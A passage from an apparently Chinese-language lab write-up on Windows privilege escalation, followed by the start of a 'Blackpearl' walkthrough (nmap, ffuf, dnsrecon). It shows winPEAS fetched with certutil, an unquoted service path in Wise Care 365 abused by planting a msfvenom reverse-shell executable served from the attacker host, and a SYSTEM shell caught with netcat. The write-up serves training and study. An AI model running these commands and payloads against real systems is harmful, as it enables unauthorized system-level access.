Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) 82574L Gigabit Network Connection</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     192.168.19.254</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 192.168.19.143</span><br><span class="line">                                 [02]: fe80::94cd:4577:bcd4:f41f</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>

<p>windows 提權工具 &gt;winpeas</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master">https://github.com/carlospolop/PEASS-ng/tree/master</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/winPEASx64.exe">https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/winPEASx64.exe</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Jenkins&gt;<span class="built_in">cd</span> c:\<span class="built_in">users</span>    </span><br><span class="line"><span class="built_in">cd</span> c:\<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">08/14/2021  04:29 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:29 AM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:30 AM    &lt;DIR&gt;          Administrator</span><br><span class="line">**08/15/2021  04:23 PM    &lt;DIR&gt;          butler**</span><br><span class="line">08/14/2021  05:25 AM    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  11,740,917,760 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">cd</span> butler</span><br><span class="line"><span class="built_in">cd</span> butler</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler</span><br><span class="line"></span><br><span class="line">08/15/2021  04:23 PM    &lt;DIR&gt;          .</span><br><span class="line">08/15/2021  04:23 PM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:16 AM    &lt;DIR&gt;          .groovy</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          3D Objects</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Contacts</span><br><span class="line">**08/14/2021  03:54 AM    &lt;DIR&gt;          Desktop</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Documents</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          Downloads**</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Favorites</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Links</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Music</span><br><span class="line">08/14/2021  03:56 AM    &lt;DIR&gt;          OneDrive</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Saved Games</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Searches</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Videos</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              16 Dir(s)  11,740,901,376 bytes free</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目錄可能會有些有用的內容</span></span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">cd</span> Downloads</span><br><span class="line"><span class="built_in">cd</span> Downloads</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Downloads&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler\Downloads</span><br><span class="line"></span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          ..</span><br><span class="line">**08/14/2021  04:23 AM        16,013,912 WiseCare365_5.6.7.568.exe**</span><br><span class="line">               1 File(s)     16,013,912 bytes</span><br><span class="line">               2 Dir(s)  11,740,901,376 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Downloads&gt;<span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">cd</span> Desktop</span><br><span class="line"><span class="built_in">cd</span> Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler\Desktop</span><br><span class="line"></span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          ..</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               2 Dir(s)  11,740,901,376 bytes free</span><br></pre></td></tr></table></figure>

<p>主要遠程將winpeas放到用戶目錄下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Users\butler&gt;**certutil.exe -urlcache -f http://192.168.19.130/winpeas.exe winpeas.exe**</span><br><span class="line">certutil.exe -urlcache -f http://192.168.19.130/winpeas.exe winpeas.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler</span><br><span class="line"></span><br><span class="line">02/16/2024  11:42 PM    &lt;DIR&gt;          .</span><br><span class="line">02/16/2024  11:42 PM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:16 AM    &lt;DIR&gt;          .groovy</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          3D Objects</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Contacts</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Desktop</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Documents</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          Downloads</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Favorites</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Links</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Music</span><br><span class="line">08/14/2021  03:56 AM    &lt;DIR&gt;          OneDrive</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Saved Games</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Searches</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Videos</span><br><span class="line">02/16/2024  11:43 PM         2,387,456 winpeas.exe</span><br><span class="line">               1 File(s)      2,387,456 bytes</span><br><span class="line">              16 Dir(s)  11,735,945,216 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;winpeas.exe</span><br><span class="line">winpeas.exe</span><br><span class="line">ANSI color bit <span class="keyword">for</span> Windows is not <span class="built_in">set</span>. If you are executing this from a Windows terminal inside the host you should run <span class="string">&#x27;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#x27;</span> and <span class="keyword">then</span> start a new CMD</span><br><span class="line">Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause <span class="literal">false</span> negatives when looking <span class="keyword">for</span> files). If you are admin, you can <span class="built_in">enable</span> it with <span class="string">&#x27;**REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1**&#x27;</span> and <span class="keyword">then</span> start a new CMD</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">[+] Legend:</span><br><span class="line">         **Red                Indicates a special privilege over an object or something is misconfigured**</span><br><span class="line">         Green              Indicates that some protection is enabled or something is well configured</span><br><span class="line">         Cyan               Indicates active <span class="built_in">users</span></span><br><span class="line">         Blue               Indicates disabled <span class="built_in">users</span></span><br><span class="line">         LightYellow        Indicates links</span><br><span class="line">....</span><br><span class="line">����������͹ Current Token privileges</span><br><span class="line">� Check <span class="keyword">if</span> you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                                            </span><br><span class="line">    SeIncreaseQuotaPrivilege: DISABLED</span><br><span class="line">    SeSecurityPrivilege: DISABLED</span><br><span class="line">    SeTakeOwnershipPrivilege: DISABLED</span><br><span class="line">    SeLoadDriverPrivilege: DISABLED</span><br><span class="line">    SeSystemProfilePrivilege: DISABLED</span><br><span class="line">    SeSystemtimePrivilege: DISABLED</span><br><span class="line">    SeProfileSingleProcessPrivilege: DISABLED</span><br><span class="line">    SeIncreaseBasePriorityPrivilege: DISABLED</span><br><span class="line">    SeCreatePagefilePrivilege: DISABLED</span><br><span class="line">    SeBackupPrivilege: DISABLED</span><br><span class="line">    SeRestorePrivilege: DISABLED</span><br><span class="line">    SeShutdownPrivilege: DISABLED</span><br><span class="line">    SeDebugPrivilege: SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeSystemEnvironmentPrivilege: DISABLED</span><br><span class="line">    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeRemoteShutdownPrivilege: DISABLED</span><br><span class="line">    SeUndockPrivilege: DISABLED</span><br><span class="line">    SeManageVolumePrivilege: DISABLED</span><br><span class="line">    **SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED**</span><br><span class="line">    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeIncreaseWorkingSetPrivilege: DISABLED</span><br><span class="line">    SeTimeZonePrivilege: DISABLED</span><br><span class="line">    SeCreateSymbolicLinkPrivilege: DISABLED</span><br><span class="line">    SeDelegateSessionUserImpersonatePrivilege: DISABLED</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">����������͹ Interesting Processes -non Microsoft-</span><br><span class="line">� Check <span class="keyword">if</span> any interesting processes <span class="keyword">for</span> memory dump or <span class="keyword">if</span> you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                                         </span><br><span class="line">    svchost(264)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM</span><br><span class="line">    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])</span><br><span class="line">    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p</span><br><span class="line">   =================================================================================================</span><br><span class="line"></span><br><span class="line">    svchost(2592)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE</span><br><span class="line">    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])</span><br><span class="line">    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p</span><br><span class="line">   =================================================================================================</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    jenkins(2388)[C:\Program Files\Jenkins\jenkins.exe] -- POwn: butler -- isDotNet</span><br><span class="line">    **Permissions: butler [AllAccess], Administrators [AllAccess]**</span><br><span class="line">    Possible DLL Hijacking folder: C:\Program Files\Jenkins (Administrators [AllAccess], butler [AllAccess])</span><br><span class="line">    Command Line: <span class="string">&quot;C:\Program Files\Jenkins\**jenkins.exe**&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">#在Download目錄下有這檔案</span></span><br><span class="line"><span class="comment">#**WiseCare365_5.6.7.568.exe</span></span><br><span class="line"><span class="comment">#當我們有能力濫用某項服務時，我們將無權停止和啟動該服務。但是，如果服務自動啟動，我們可以利用關機權限來重新啟動機器；以及最終的服務。**</span></span><br><span class="line">**WiseBootAssistant**(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\**Wise Care 365**\BootTime.exe] - Auto - Running **- No quotes and Space detected**</span><br><span class="line">    YOU CAN MODIFY THIS SERVICE: AllAccess</span><br><span class="line">    File Permissions: Administrators [AllAccess]</span><br><span class="line">    Possible DLL Hijacking <span class="keyword">in</span> binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])</span><br><span class="line">    In order to optimize system performance,Wise Care 365 will calculate your system startup <span class="keyword">time</span>.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://juggernaut-sec.com/unquoted-service-paths/">https://juggernaut-sec.com/unquoted-service-paths/</a></p>
<ul>
<li><p><strong>No quotes and Space detected 告訴我們的那些事:</strong></p>
<p>  當涉及 <strong>Windows 權限升級技術</strong>時，常見的升級路徑是利用<strong>錯誤配置的服務</strong>。服務配置錯誤的方式有很多種；最有趣的情況是<strong>未加引號的服務路徑</strong>(unquoted service paths)</p>
<p>  當服務指向的路徑中的<strong>可執行檔沒有空格或有空格但用引號引起來</strong>時，該服務將直接沿著該路徑到達可執行檔並按預期啟動。例如：C:\temp\service.exe 和「C:\tempfolder\service.exe」配置正確，將執行service.exe。</p>
<p>  假設您有一個從下列檔案位置執行的服務：<strong>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</strong></p>
<p>  由於<strong>服務可執行檔案的檔案路徑中有空格且沒有引號</strong>，因此服務將<strong>嘗試透過將空格之前的資料夾</strong>名稱的每個部分視為<strong>駐留在上一個資料夾中的可執行檔</strong>來啟動，如下所示：</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files\Juggernaut.exe</li>
<li>C:\Program Files\Juggernaut Prod\Production.exe</li>
<li>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</li>
</ul>
<p>  如果我們有權在實際可執行位置之前的三個資料夾中的任何一個中寫入，那麼我們可以製作一個可執行檔並<strong>根據路徑中的資料夾</strong>名稱對其進行命名，如上面的範例所示。之後，當<strong>服務啟動</strong>時，它將執行.exe惡意程序，而不是預期的程序。</p>
<p>  如果我們可以寫入C:. 我們將製作一個名為 Program.exe 的可執行檔並將其放置在 C:\ 中。如果我們可以寫入 C:\Program Files，我們將製作一個名為 Juggernaut.exe 的可執行檔並將其放置在 C:\Program Files 中。等等…</p>
</li>
</ul>
<p>檢測到該服務不含引號 C:\Program Files (x86)\Wise**Wise Care 365**\BootTime.exe</p>
<p><img src="/img/privilege_Untitled_39.png" alt="Untitled"></p>
<p>也就是說可以利用這個特性</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files (x86)\Wise\Wise.exe</li>
</ul>
<p>所以可以製作一個惡意程式叫Wise.exe，對win10做提權</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/testscript/trans]</span><br><span class="line">└─# **msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.19.130 LPORT=7777 -f exe&gt; Wise.exe**</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/testscript/trans]</span><br><span class="line">└─# **python3 -m http.server 80**                                                                 </span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -nlvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\&gt;<span class="built_in">cd</span> <span class="string">&quot;Program Files (x86)&quot;</span>                          </span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;Program Files (x86)&quot;</span></span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files (x86)</span><br><span class="line"></span><br><span class="line">08/14/2021  04:34 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:34 AM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:05 AM    &lt;DIR&gt;          Common Files</span><br><span class="line">12/07/2019  01:49 AM    &lt;DIR&gt;          Internet Explorer</span><br><span class="line">02/17/2024  01:37 PM    &lt;DIR&gt;          Microsoft</span><br><span class="line">12/07/2019  01:31 AM    &lt;DIR&gt;          Microsoft.NET</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">12/07/2019  01:52 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">12/07/2019  01:49 AM    &lt;DIR&gt;          Windows NT</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">12/07/2019  01:52 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">12/07/2019  01:31 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          Wise</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              15 Dir(s)  11,391,279,104 bytes free</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)&gt;**<span class="built_in">cd</span> Wise**</span><br><span class="line"><span class="built_in">cd</span> Wise</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files (x86)\Wise</span><br><span class="line"></span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/17/2024  12:38 AM    &lt;DIR&gt;          Wise Care 365</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)  11,396,620,288 bytes free</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;**certutil -urlcache -f http://192.168.19.130/Wise.exe Wise.exe**</span><br><span class="line">certutil -urlcache -f http://192.168.19.130/Wise.exe Wise.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>

<p>如果直接執行 <code>./Wise.exe</code> 運行的是普通用戶</p>
<p>先重啟WiseBootAssistant服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Program Files (x86)\Wise&gt;sc stop WiseBootAssistant</span><br><span class="line">sc stop WiseBootAssistant</span><br><span class="line">[SC] ControlService FAILED 1062:</span><br><span class="line"></span><br><span class="line">The service has not been started.</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;sc query WiseBootAssistant</span><br><span class="line">sc query WiseBootAssistant</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: WiseBootAssistant </span><br><span class="line">        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)</span><br><span class="line">        STATE              : 1  STOPPED </span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;**sc start WiseBootAssistant**</span><br><span class="line">sc start WiseBootAssistant</span><br></pre></td></tr></table></figure>

<p>在啟動服務的當下就成功執行Wise.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -nlvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.143] 49713</span><br><span class="line">Microsoft Windows [Version 10.0.19043.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-Blackpearl"><a href="#Walkthrough-Blackpearl" class="headerlink" title="Walkthrough - Blackpearl"></a><strong>Walkthrough - Blackpearl</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -T4 -A -p- 192.168.19.144</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 04:21 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.144</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">**22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)</span><br><span class="line">|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)</span><br><span class="line">|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)</span><br><span class="line">**53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)**</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian</span><br><span class="line">**80/tcp open  http    nginx 1.14.2**</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">MAC Address: 00:0C:29:5B:A7:0C (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.94 ms 192.168.19.144</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 25.08 seconds</span><br></pre></td></tr></table></figure>

<p>80port開啟了nginx網頁，網頁源碼中能看到藏了訊息</p>
<ul>
<li><!-- Webmaster: alek@blackpearl.tcm -→</li>
</ul>
<p><img src="/img/privilege_Untitled_40.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_41.png" alt="Untitled"></p>
<p>接下來對網頁掃描存在的目錄</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.144/FUZZ**</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.19.144/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 3ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 3ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 10ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 11ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string">**secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 5ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:35] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>網頁下沒有其他目錄，但找到了一個<strong>secret文件</strong></p>
<p><img src="/img/privilege_Untitled_42.png" alt="Untitled"></p>
<p>看到53port有開啟，常試DNS爆破域名</p>
<ul>
<li><p>dnsrecon工具</p>
<ul>
<li>Scan a domain and save the results to a SQLite database:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --db &#123;&#123;path/to/database.sqlite&#125;&#125;</code></p>
<ul>
<li>Scan a domain, specifying the nameserver and performing a zone transfer:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --name_server &#123;&#123;nameserver.example.com&#125;&#125; --type axfr</code></p>
<ul>
<li>Scan a domain, using a dictionary of subdomains and hostnames for bruteforcing:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --dictionary &#123;&#123;path/to/dictionary.txt&#125;&#125; --type brt</code></p>
<ul>
<li>Scan a domain, performing a reverse lookup of IP ranges from the SPF record and saving the results to a JSON file:</li>
</ul>
